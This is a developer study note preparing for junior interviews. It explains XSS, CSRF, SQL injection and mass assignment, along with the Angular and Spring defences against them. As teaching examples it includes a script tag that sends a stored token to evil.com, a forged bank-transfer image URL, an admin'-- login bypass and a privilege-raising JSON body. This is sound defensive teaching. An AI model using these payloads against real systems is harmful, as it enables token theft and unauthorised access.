# Security vulnerabilities

Docs: [OWASP Top 10](https://owasp.org/www-project-top-ten/) · [MDN — XSS](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting) · [MDN — CSRF](https://developer.mozilla.org/en-US/docs/Glossary/CSRF)

---

The three attacks that come up most in junior interviews for web developers. You don't need to exploit them — you need to know what they are, how they work, and how your framework protects against them.

---

## XSS — Cross-Site Scripting

The attacker injects malicious JavaScript into a page that other users then load.

```
User submits a comment:
<script>fetch('https://evil.com?token=' + localStorage.getItem('token'))</script>

If the app renders this as HTML, every user who loads the page
sends their token to the attacker.
```

**How Angular protects you:** Angular escapes all dynamic values by default — `{{ userInput }}` renders as text, not HTML. The injected `<script>` tag appears as literal text on screen, never executes. You have to deliberately bypass this with `[innerHTML]` or `DomSanitizer.bypassSecurityTrustHtml()`.

**Never use `[innerHTML]` with user-provided content.**

---

## CSRF — Cross-Site Request Forgery

The attacker tricks a logged-in user's browser into making a request to your API without the user knowing. Works because cookies are sent automatically.

```
User is logged in to bank.com (session cookie stored in browser)
User visits evil.com
evil.com has: <img src="https://bank.com/transfer?to=attacker&amount=1000">
The browser sends the request — with the bank.com cookie attached automatically
```

**Why JWT in localStorage is safe from CSRF:** localStorage is never sent automatically. The attacker's page cannot make the request carry the JWT because JavaScript on `evil.com` cannot read `localStorage` from `bank.com` (Same-Origin Policy).

**How Spring Security protects you:** CSRF protection is enabled by default in Spring Security for session-based apps. In TimeTrack, CSRF is disabled because JWT in a header is already CSRF-safe — the header must be set explicitly by JavaScript, which the attacker cannot do cross-origin.

```java
http.csrf(csrf -> csrf.disable()); // safe because we use JWT, not cookies
```

---

## SQL Injection

The attacker injects SQL code into an input that gets used in a database query.

```
Login form — username: admin'--
The query becomes:
SELECT * FROM users WHERE username = 'admin'--' AND password = '...'
The -- comments out the password check — attacker logs in as admin
```

**How Spring Data JPA protects you:** JPA and JPQL use parameterised queries automatically. The values are never concatenated into the SQL string — they are passed as parameters, so SQL special characters are treated as data, not code.

```java
// Safe — Spring Data JPA generates parameterised SQL:
userRepository.findByEmail(email);
// → SELECT * FROM users WHERE email = ?  (email passed as parameter)
```

**Never build SQL strings by concatenating user input.** If you ever write native queries with `@Query(nativeQuery = true)`, always use `:param` placeholders, never string concatenation.

---

## Mass assignment — why you never bind the request body to the entity

If a controller binds the incoming JSON straight to the `@Entity`, a malicious client can set fields it should never control, just by adding them to the body:

```json
// the client sends this to POST /api/users
{ "email": "me@x.com", "password": "...", "role": "MANAGER", "active": true }
```

If you bind that JSON directly to the `User` entity, the attacker just made themselves a manager. This is **mass assignment**.

The fix is the **request DTO**: it declares *only* the fields a client is allowed to send. There is no `role` or `active` field on `CreateUserRequest`, so even if the attacker adds them to the JSON, Jackson has nowhere to put them and they are ignored:

```java
public class CreateUserRequest {
    @NotBlank private String email;
    @NotBlank private String password;
    // no role, no active — the client cannot set these
}
```

> Interview answer to "what could go wrong if you bind the entity directly?": mass assignment — the client could set privileged fields like `role` or `active`.

---

## Always validate on the server — the client is never the boundary

Client-side validation (Angular `Validators`, disabled buttons) is for **user experience** — instant feedback, no wasted round-trips. It is **not** security. Anyone can bypass the Angular app entirely and call your API directly with Postman, `curl`, or the browser DevTools, sending whatever they like.

The server is the only boundary you control, so every rule must be enforced there too — `@NotBlank` / `@Valid` on the DTO, plus the business rules in the service. The Angular validation and the Spring Boot validation are not duplication: one is UX, the other is the real defence.

---

## Summary

| Attack | How it works | Main protection |
|--------|-------------|-----------------|
| XSS | Inject script into page | Angular escapes output by default |
| CSRF | Trick browser into sending cookies | JWT in header is CSRF-safe; Spring Security CSRF for sessions |
| SQL Injection | Inject SQL into a query | JPA uses parameterised queries automatically |

The common pattern: all three attacks involve **injecting untrusted data** into a trusted context — HTML, HTTP requests, or SQL. The defences all involve treating user input as data, never as code.
